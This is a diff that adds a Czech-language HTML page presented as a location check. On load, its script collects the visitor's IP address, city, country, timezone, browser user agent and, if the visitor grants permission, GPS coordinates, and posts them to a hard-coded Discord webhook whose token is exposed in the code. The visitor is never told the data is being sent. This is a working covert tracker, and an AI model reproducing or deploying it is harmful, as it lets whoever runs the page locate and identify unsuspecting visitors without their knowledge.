@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+  <meta charset="UTF-8" />
+  <title>Zjišťování polohy</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 2rem; }
+    pre { background: #f4f4f4; padding: 1rem; border-radius: 5px; display: inline-block; text-align: left; }
+  </style>
+</head>
+<body>
+  <h1>Zjišťujeme údaje...</h1>
+  <div id="ipLocation">
+    <h2>IP location:</h2>
+    <pre>Načítám...</pre>
+  </div>
+  <div id="geoLocation">
+    <h2>Geo location:</h2>
+    <pre>Čekám na povolení GPS...</pre>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1376841162370973716/OWCzBKZ92GkMfw_a0JDDeuYH2hgwRUg7WzKcOCqvnAFfW97IE8B-I6yN8J1fQrrWiZQk";
+
+    let ipInfoData = null;
+    let geoCoordsData = null;
+
+    function sendToDiscord() {
+      if (!ipInfoData) return;
+
+      const geoText = geoCoordsData
+        ? `📌 GPS souřadnice: ${geoCoordsData.latitude}, ${geoCoordsData.longitude}`
+        : "📌 GPS souřadnice: nebyly povoleny nebo dostupné";
+
+      const message = {
+        content: `📥 **Nový přístup**
+🌍 IP location:
+ - IP: ${ipInfoData.ip}
+ - Stát: ${ipInfoData.country_name}
+ - Město: ${ipInfoData.city}
+ - Časové pásmo: ${ipInfoData.timezone}
+
+${geoText}
+
+🧠 User-Agent: ${navigator.userAgent}
+🕓 Čas: ${new Date().toISOString()}`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message)
+      }).catch(console.error);
+    }
+
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(ipInfo => {
+        ipInfoData = ipInfo;
+        document.querySelector("#ipLocation pre").innerText =
+          `IP: ${ipInfo.ip}\nStát: ${ipInfo.country_name}\nMěsto: ${ipInfo.city}\nČasové pásmo: ${ipInfo.timezone}`;
+
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(position => {
+            geoCoordsData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            };
+            document.querySelector("#geoLocation pre").innerText =
+              `Latitude: ${geoCoordsData.latitude}\nLongitude: ${geoCoordsData.longitude}`;
+
+            sendToDiscord();
+          }, error => {
+            document.querySelector("#geoLocation pre").innerText =
+              "GPS poloha nebyla povolena nebo došlo k chybě: " + error.message;
+            sendToDiscord();
+          });
+        } else {
+          document.querySelector("#geoLocation pre").innerText =
+            "Geolokace není podporována.";
+          sendToDiscord();
+        }
+      })
+      .catch(() => {
+        document.querySelector("#ipLocation pre").innerText = "Chyba při načítání IP.";
+        sendToDiscord();
+      });
+  </script>
+</body>
+</html>
